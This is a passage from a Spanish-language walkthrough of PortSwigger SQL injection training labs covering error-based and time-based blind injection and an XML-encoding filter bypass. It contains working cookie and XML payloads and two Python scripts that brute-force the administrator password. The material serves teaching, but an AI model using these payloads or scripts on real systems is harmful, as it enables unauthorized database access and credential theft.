Y podemos ver que nos responde:

![i5](/assets/images/SQLiPortswigger/lab12/intercept5.png)

Entonces sabemos que ya es oracle y ya está interpretando nuestras consultas, y para asegurar que lo esta interpretando cambiaremos el nombre de dual por alguna tabla que no exista:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA'||(SELECT '' FROM asopdkaps)||'`

Esto lo hacemos para ver si está interpretando correctamente las consultas y no nos devuelva todo verdadero como en un principio, así que esto nos responde:

![i6](/assets/images/SQLiPortswigger/lab12/intercept6.png)

Podemos apreciar que nos marca error, por lo que nos damos cuenta de que está funcionando correctamente y nos está interpretando las consultas inyectadas.

<br>

Ahora que hemos encontrado el punto vulnerable es hora de empezar a enumerar la base de datos, primero recordamos que nos dice que existe una tabla llamada **users**, y para comprobar esto usaremos la siguiente consulta:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`

Aqui lo que hicimos fue poner que nos tome un valor vacío de la tabla **users**, y agregamos que nos tome solo de la primera fila de datos, esto para evitar que nos dé error por no especificarle de que parte de la tabla exactamente queremos tomar ese valor vacío.

Esto en caso de que la tabla **users** exista nos mostrara la página web normalmente, como sucede aquí:

![i7](/assets/images/SQLiPortswigger/lab12/intercept7.png)

Vemos que quiere decir que si existe una tabla llamada **users**, ya que de lo contrario al indicarle una tabla que no existe nos daría un error y eso podemos comprobarlo poniendo una tabla que no exista:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA'||(SELECT '' FROM asdsas WHERE ROWNUM = 1)||'`

Dándonos obviamente un error:

![i8](/assets/images/SQLiPortswigger/lab12/intercept8.png)

Y esto demuestra nuevamente que está funcionando correctamente nuestras consultas inyectadas.

<br>

Ahora que sabemos que existe la tabla **users**, intentaremos descubrir si existe el usuario "administrator" en la columna **username** de la tabla **users**:

Usando la siguiente consulta:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA'||(SELECT '' FROM users WHERE username = 'administrator')||'`

Y nos responde:

![i9](/assets/images/SQLiPortswigger/lab12/intercept9.png)

Podemos apreciar que nos responde con un estado 200, lo cual indica que en teoría debería estar bien y que el usuario si existe, pero ahora probaremos con un usuario inexistente para probar si está interpretando nuestras consultas de la subconsulta:

`SELECT * from products WHERE TrackingId=X3GUYDqzaHtN5MlA'||(SELECT '' FROM users WHERE username = 'administraasdada')||'`

Y esta consulta nos responde que es correcto:

![i10](/assets/images/SQLiPortswigger/lab12/intercept10.png)

<br>

Por lo que ya podemos sospechar que no está funcionando bien las respuestas condicionales, ya que ese usuario no existe y sin embargo nos muestra como si existiera, así que ahora modificaremos la consulta a esto:

`TrackingId=xyz'||(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

Lo que hace esta consulta es verificar primero si existe la tabla dual, en caso de que exista tomara valor true y se ejecutara el primer CASE en SELECT, lo que preguntara si 1=1, como esto es cierto entonces ejecuta una división de 1 entre 0 que sabemos que da error, pero esto lo hacemos solo para darnos cuenta de que la tabla dual existe, ya que entro a la parte donde nos muestre el error.

Y en caso de que la tabla dual no exista, solo pasaría directo al else enviando una cadena vacía sin código de error.

Esto lo hacemos para poder identificar si nuestra consulta fue exitosa o no en base a los estados de respuesta, en este caso el error 500 quiere decir que la consulta concatenada devuelve un valor true, ya que está entrando a la parte de la división donde provoca este error, y solo lo provoca si pasa por el CASE WHEN, pero en caso de que sea falso no nos mostrara nada solo una cadena vacía se enviara y veremos un estado 200, que en este caso para nosotros es false.

La respuesta de esta consulta es:

![i11](/assets/images/SQLiPortswigger/lab12/intercept11.png)

Podemos apreciar que nos da un error 505, lo cual en nuestro caso significa true, por lo que en teoría está devolviendo un valor true, pero provocamos por medio de la condición que se provoque un error 500 para darnos cuenta de que la respuesta fue true, pero para comprobar que las consultas se interpretan correctamente le cambiaremos el (1=1) por (2=1), esto nos debe de dar un estado 200, ya que sería false pasando a la cadena vacía y no mostrar nada:

`TrackingId=xyz'||(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

Y vemos que nos responde:

![i12](/assets/images/SQLiPortswigger/lab12/intercept12.png)

Por lo que al parecer esta funcionando correctamente y nos está interpretando nuestras consultas, lo que sigue es, como ya tenemos la tabla y el usuario que el mismo laboratorio nos proporcionó, lo que haremos es crear una consulta:

`TrackingId=xyz'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'`

Va de derecha a izquierda, primero comprueba que exista el usuario "administrator" en la tabla users, si esto es verdadero ira a él case de select, y revisara si 1=1, entonces provocara intencionalmente un error de estado 500 dividiendo 1 entre 0, y como esto no se puede nos dará un error, con este error nos daremos cuenta de que la petición tomo valor de true, por lo que sabemos que el usuario existe, ya que paso por el primer case.

En caso de que el usuario "administrator" no exista en la tabla users, no pasara a el case de select, sino que pasará directamente al else, lo cual esto solo hace devolver una cadena vacía, lo que significa que dará un estado de 200.

Así que para saber si nuestra consulta fue exitosa el estado debe ser 500 y no 200.

Así que hemos configurado una especie de sistema donde el estado de error 500 es True, y el estado 200 es false en base a nuestras consultas.

Y donde está el valor de (1=1), nos servirá para poner nuestras consultas y saber en base a la respuesta de los estados de error, saber si eso es verdadero o no lo es.

<br>

Ahora probaremos la respuesta con esta nueva consulta:

![i13](/assets/images/SQLiPortswigger/lab12/intercept13.png)

Podemos apreciar que nos da un error 500, por lo que en teoría el usuario administrator existe dentro de la tabla users.

Ya que de lo contrario al poner un usuario inexistente como por ejemplo:

`TrackingId=xyz'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administadada')||'`

Y nos responderá:

![i14](/assets/images/SQLiPortswigger/lab12/intercept14.png)

Por lo que sabemos que está interpretando nuestras consultas y nos está devolviendo información correcta.

<br>

Ahora intentaremos descubrir cuantos caracteres contiene la contraseña del usuario administrator.

`TrackingId=xyz'||(select case when LENGTH(password)>10 then to_char(1/0) else '' end from users where username='administrator')||'`

Ahora lo que hicimos fue reemplazar la condicion que siempre era verdadera "(1=1)" que usamos para comprobar la existencia de tablas y columnas, esta la reemplazaremos por una consulta, esta consulta servira para verificar si la cantidad de caracteres de la contraseña es mayor a 10.

Como recordamos empieza de izquierda a derecha, por lo que primero verifica si existe el usuario "administrator" dentro de la tabla "users", en caso de que exista comprobara si la longitud del valor password anteriormente seleccionado de la fila donde el usuario es administrator, verificara si es mayor a 10 caracteres, y en caso de ser cierto como sabemos nos provocara el error 500, y en caso de ser falso irá a el else mostrandonos una cadena vacia y un estado de codigo 200. lo cual sabemos que sería false.

Y al tramitar esta consulta recibimos esta respuesta:

![l1](/assets/images/SQLiPortswigger/lab12/length1.png)

Vemos que nos responde en la parte derecha con un estado de error 500, lo cual significa que es verdadero, o sea que la contraseña de administrator tiene más de 10 caracteres de longitud.

<br>

Por lo que ahora le diremos que si es mayor a 25 caracteres:

`TrackingId=xyz'||(select case when LENGTH(password)>25 then to_char(1/0) else '' end from users where username='administrator')||'`

y nos responde:

![l2](/assets/images/SQLiPortswigger/lab12/length2.png)

Ahora vemos que nos da un estado de 200, por lo cual indica que es false, así que debemos seguir hasta descubrir la longitud de la contraseña:

![l3](/assets/images/SQLiPortswigger/lab12/length3.png)

Después de varios intentos, descubrimos que la contraseña es igual a 20 caracteres.

<br>

Por lo que al saber esto ahora debemos enumerar dicha contraseña del usuario administrator.

Reutilizaremos el script que ya habíamos creado.

Pero esta vez solo cambiaremos algunas cosas al script que usamos:

```py
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0ad400e704c50f56c067044e00340081.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1,21):

        for character in characters:

            cookies = {
                'TrackingId': "1XdkxLl4gbzwLsIZ'||(select CASE WHEN SUBSTR(password,%d,1)='%s' then TO_CHAR(1/0) else '' end FROM users WHERE username='administrator')||'" % (position, character),
                'session': 'RxsbjGd7h0vXIfDaHFy7lIssTkUIwHwn'
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if  r.status_code == 500:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeRequest()
```

Primero la variable "main_url", que es obvio que debe cambiar, ya que es otro laboratorio.

Después el payload de la cookie, el cual agregamos nuestro nuevo payload de cookie, y también usamos los espacios donde se iran fuzeando los diferentes caracteres y posiciones de los bucles for.

También cambio la sesion, ya que como en main_url, es otro laboratorio.

Y por último cambiamos lo de verificar si en la respuesta nos devolvía el mensaje "WelcomeBack!", ya que ahora nos basaremos en la respuesta del servidor, por lo que usamos esta línea:

`if  r.status_code == 500:`

> Recuerda que en este caso 500 es true y 200 falso, por lo que en caso de ser 500 pasara a agregarse el carácter actual a la variable que va almacenando la contraseña.

Por lo que si ya entendimos la lógica podremos ejecutarlo y completar este laboratorio.

<br>

<div id='id13' />

# Laboratorio 13: Inyección ciega de SQL con retrasos de tiempo

Este siguiente laboratorio nos pide lo siguiente:

![lab13](/assets/images/SQLiPortswigger/lab13/lab13.png)

Vemos que nos dice que este método de inyección no es blind basada en errores ni basada en condicionales, pero dice que esta basada en retrasos de tiempo y esta vulnerabilidad se encuentra en la cookie.

<br>

Primero intentaremos romper la consulta usando una comilla como lo hacemos normalmente:

`TrackingId=xyz'`

Y vemos que no nos da ningún error ni nada fuera de lo normal:

![c1](/assets/images/SQLiPortswigger/lab13/comilla.png)

Así que intentamos con 2 comillas para ver si existía alguna colgada por detrás o algo así:

`TrackingId=xyz''`

![c2](/assets/images/SQLiPortswigger/lab13/comilla2.png)

Y podemos ver que sigue saliendo todo normal, por lo que sospechamos que no esta basada en condicionales o errores como nos mostraron anteriormente.

Ahora es donde intentamos este nuevo método.

![ch](/assets/images/SQLiPortswigger/lab13/cheat.png)

Aquí podemos ver que hay formas de hacer llamada a una función para detener el tiempo por ciertos segundos, en este caso 10.

Así que concatenamos a la consulta uno de estos y fuimos probando hasta descubrir que la correcta era:

`TrackingId=xyz' || pg_sleep(10)-- -`

Y al tramitar esta consulta nos esperó 10 segundos para después mostrar lo que venía por defecto, pero esto nos indica que es vulerable, ya que nos tardó el tiempo especificado en responder.

![consulta](/assets/images/SQLiPortswigger/lab13/consulta.png)

Así que al hacer esta consulta terminamos este laboratorio:

![fin](/assets/images/SQLiPortswigger/lab13/fin.png)

Pero obviamente esto solo fue una introducción, lo siguiente está en el siguiente laboratorio.

<br>

<div id='id14' />

# Laboratorio 14: Inyección SQL ciega con retardos de tiempo y recuperación de información

El siguiente laboratorio nos mostrará como enumerar datos usando una vulnerabilidad SQLi ciega basada en tiempo.

El laboratorio nos dice lo siguiente:

![lab14](/assets/images/SQLiPortswigger/lab14/lab14.png)

Vemos que nos dice esto y debemos enumerar la contraseña del usuario "administrator" en la tabla users.

<br>

Recordamos que la que usamos basada en errores se veía algo así:

`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) else '' END FROM users WHERE username='administrator')||'`

Recordemos que verifica que existe el usuario "administrator" en la tabla username, y en caso que exista pasa a él case when donde comprobara la condición que en este caso es 1=1 por lo que da valor true, pasando a ejecutar la división que nos dará error 500.

Caso contrario irá al else mostrándonos un estado 200, ya que no hemos corrompido nada.

<br>

Lo que haremos es algo similar, pero esta vez basándonos en la respuesta del servidor, la cadena modificada se verá algo así:

`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) else pg_sleep(0) END)||'`

Primero en esta consulta estamos concatenando una consulta en la cual en caso de que 1=1 se debe ejecutar el sleep de 5 segundos, y caso contrario debe hacer un sleep de 0 segundos y terminar.

Así que probaremos esta consulta tramitándola y ver que respuesta da:

![5seg](/assets/images/SQLiPortswigger/lab14/time5.png)

Vemos que está en gris la parte de la respuesta, ya que está tardando 5 segundos en responder, y después de 5 segundos nos llega la respuesta:

![5r](/assets/images/SQLiPortswigger/lab14/5r.png)

Y vemos que nos responde, por lo que está interpretando nuestra consulta basada en tiempo y funcionando, ahora para confirmar que funciona le daremos que compruebe si 2=1, cosa que sabemos es falsa, pero veremos si funciona y responde como debe, tardar 0 segundos:

![0seg](/assets/images/SQLiPortswigger/lab14/0seg.png)

Podemos ver que tardo 0 segundos, por lo que nuestra consulta funciona y en base al tiempo podemos ir sabiendo que cosas son verdaderas y que no.

<br>

Así que sabemos que hay un usuario administrator en la tabla users con columna llamada "password", por lo que crearemos la consulta basada en esos datos:

`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(5) else pg_sleep(0) END FROM users WHERE username='administrator')||'`

En caso de que el usuario "administrator" exista en la tabla users, comprobara si el primer carácter de la contraseña de administrator es "a", en caso de serlo tardara 5 segundos, en caso de no serlo tardara 0 segundos en responder.

Así que al tramitar esta consulta nos damos cuenta de que respondió en 0 segundos.

Por lo que probamos con otros caracteres y nos dimos cuenta de que iniciaba con otro carácter.

<br>

Ahora ocupamos saber la longitud de la contraseña, que sabemos es usando:

`TrackingId=xyz'||( SELECT CASE WHEN LENGTH(password)>=20 then pg_sleep(5) else pg_sleep(0) end FROM users WHERE username='administrator')||'`

Le decimos que en caso de que exista el usuario administrator en la tabla users, nos  verifique si la columna password de la fila de administrator su longitud es mayor o igual a 20, y descubrimos que es igual a 20, por lo que la longitud ya la tenemos.

<br>

Así que para automatizar lo de dumpear la contraseña de ese usuario reutilizaremos el script que ya tenemos programado solo cambiando algunas cosas:

```bash
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a3600b204db9b59c084f05d00880084.web-security-academy.net/"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    
    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1,21):

        for character in characters:

            cookies = {
                    'TrackingId': "eSJZCcY0vUyeTnfo'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' then pg_sleep(15) else pg_sleep(0) end FROM users WHERE username='administrator')||'" % (position, character),
                'session': '3j6x4gByXLok6suiJlcxoV5Rx6EwmNyP'
                }
            
            p1.status(cookies['TrackingId'])

            time_start = time.time()

            r = requests.get(main_url, cookies=cookies)
            
            time_end = time.time()

            if  time_end - time_start >= 15:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeRequest()
```

Primero obviamente cambiamos la url de la variable main_url, ya que como sabemos es otro laboratorio.

Obviamente cambia el diccionario con el que fuzzearemos todos los caracteres y posiciones a la consulta creada asignándole sus parámetros enlazados a los ciclos for.

Quedando nuestro diccionario de cookie así:

`'TrackingId': "xyz'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' then pg_sleep(15) else pg_sleep(0) end FROM users WHERE username='administrator')||'" % (position, character)`

Esta consulta es como la que habíamos creado, pero esta vez en vez de los valores que cambiaran para fuzzear la password de administrador, usamos los indicadores que le dirán a python que por cada ciclo cambiara un carácter y su posición, y dentro del mismo for lo que sigue es esto:

```bash
time_start = time.time()

            r = requests.get(main_url, cookies=cookies)
            
            time_end = time.time()

            if  time_end - time_start >= 15:
                password += character
                p2.status(password)
                break
```

Con la variable **time_start** le estamos indicando que guarde el valor del tiempo actual.

Después de eso se ejecuta la petición actual y cuando termine creamos otra variable llamada **time_end** la cual nos volverá a obtener el tiempo actual, pero obviamente será diferente al del inicio, ya que paso tiempo en lo que se ejecutó la petición GET.

Después comprueba si el tiempo inicial menos el tiempo final, quedándonos solo los segundos de diferencia que pasaron durante esa petición, es mayor o igual a 15, entonces quiere decir que esa petición es **true**, por lo que se agregara a la variable de contraseña.

> Recuerda que es 15 segundos, ya que en la consulta donde están las cookies decimos que si es verdadero nos haga un sleep de 15 seg.

<br>

Al ejecutar este script obtendremos en unos minutos la password del usuario "administrator" y habremos terminado este laboratorio.

<br>

# Laboratorios 15 y 16 pendientes.....

<br>

<div id='id17' />

# Laboratorio 17: Inyección SQL con omisión de filtro a través de codificación XML

![17](/assets/images/SQLiPortswigger/lab17/lab17.png)

En este laboratorio nos indica que la vulnerabilidad no es de las vistas anteriormente (basada en errores, basada en respuestas condicionales, basada en errores condicionales o basada en tiempo), sino que es otro modo.

Nos dice que existe una vulnerabilidad SQLi en la función de verificar existencias de productos.

Cuando vamos a la página y buscamos algo que haga esa función nos encontramos con esto:

![function](/assets/images/SQLiPortswigger/lab17/funcion.png)

Al abrir un producto nos encontramos esta siguiente función la cual nos indica cuantos productos de ese tipo quedan.

<br>

Como sabemos que aquí está la vulnerabilidad vamos a interceptar la petición al darle click al botón que dice "Check stock", y recibiremos la siguiente petición:

![xml](/assets/images/SQLiPortswigger/lab17/xml.png)

Como vemos nos interceptó la petición del botón de verificar existencias, y vemos que nos devuelve una pequeña instrucción XML al final de la petición:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			8
		</productId>
		<storeId>
			2
		</storeId>
	</stockCheck>
```

Intentaremos inyectar la consulta donde está la etiqueta `<productId>`, ya que tal vez se comunique con una base de datos para obtener ese resultado, así que agregamos la consulta:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			8 UNION SELECT NULL -- -
		</productId>
		<storeId>
			2
		</storeId>
	</stockCheck>
```

Y al tramitar esta petición apreciamos lo siguiente en la respuesta:

![attack](/assets/images/SQLiPortswigger/lab17/attack.png)

Apreciamos que nos detectó que estamos intentando ejecutar nuestras consultas y nos da un mensaje del firewall que protege el sistema.

<br>

Una manera para evadir esto es ir a "Extensions>Bapp Store" dentro de BurpSuite, y buscaremos una extension llamada Hackvector, y nos la instalamos:

![hv](/assets/images/SQLiPortswigger/lab17/hackvector.png)

Una vez instalada, volveremos a el repeater de nuestra peticion y seleccionaremos nuestra consulta inyectada, osea "UNION SELECT NULL -- -" dando click derecho:

"Extension>Hackvector>Encode>hex_entities"

Y una vez lo hagamos se nos transformara y daremos en tramitar peticion:

Nos agregara la etiqueta `<@hex_entities>` a el codigo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			<@hex_entities>
				8 UNION SELECT NULL -- -
			<@/hex_entities>
		</productId>
		<storeId>
			2
		</storeId>
	</stockCheck>

```

Vemos que nos agregó esas etiquetas, ahora tramitaremos la petición y veremos:

![res](/assets/images/SQLiPortswigger/lab17/response.png)

Vemos que no nos muestra nada, por lo que puede que la inyección no vaya en esta etiqueta, así que otra que puede estar comunicándose con una base de datos sería `<storeId` por lo que lo cambiaremos ahí:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		8
	</productId>
	<storeId>
		<@hex_entities>
			2 UNION SELECT NULL -- -
		<@/hex_entities>
	</storeId>
</stockCheck>

```

Y ahora en este caso podemos apreciar que ya nos responde la petición inyectada:

![null](/assets/images/SQLiPortswigger/lab17/null.png)

Vemos que nos dice NULL, por lo que sabemos que esta columna puede ser de tipo carácter, así que trataremos de dumpear datos, por ejemplo las bases de datos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			8
		</productId>
		<storeId>
			<@hex_entities>
				2 UNION SELECT schema_name FROM information_schema.schemata  -- -
			<@/hex_entities>
		</storeId>
	</stockCheck>
```

Y vemos que nos responde:

![dump](/assets/images/SQLiPortswigger/lab17/dump.png)

Podemos apreciar que nos devolvió las bases de datos, por lo que es vulnerable, como ya nos dieron el usuario y la tabla con sus columnas simplemente enumeraremos la password para terminar este último laboratorio:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			8
		</productId>
		<storeId>
			<@hex_entities>
				2 UNION SELECT password FROM users WHERE username='administrator' -- -
			<@/hex_entities>
		</storeId>
	</stockCheck>
```

Y nos dumpeara la contraseña del usuario administrator:

![password](/assets/images/SQLiPortswigger/lab17/password.png)

Y podremos terminar el último laboratorio.

<br>

Estos fueron todos los laboratorios de esta página, pero aún faltan cosas como enumerar todas las bases de datos sin conocer ni tabla, ni columnas, ni nada, empezando desde 0, para esto podemos practicar e investigar más sobre esto en próximos posts y se recomienda aprender sobre estos recursos:

<br>

[Inyecciónes SQL ciegas (creditos: defendtheweb.net)](https://defendtheweb.net/article/blind-sql-injection?fbclid=IwAR1BHzkyCQGr-IciLqfxq8G7tFlJkDV71-Xgv94WDpFUQuZ_6VGM4_W4-Bc)

[Maquina Cronos (creditos: s4vitar)](https://www.youtube.com/watch?v=kBw3UyBt7Hc)

[Resolución de los laboratorios vistos pero en video (creditos: s4vitar)](https://www.youtube.com/watch?v=C-FiImhUviM)

<br>
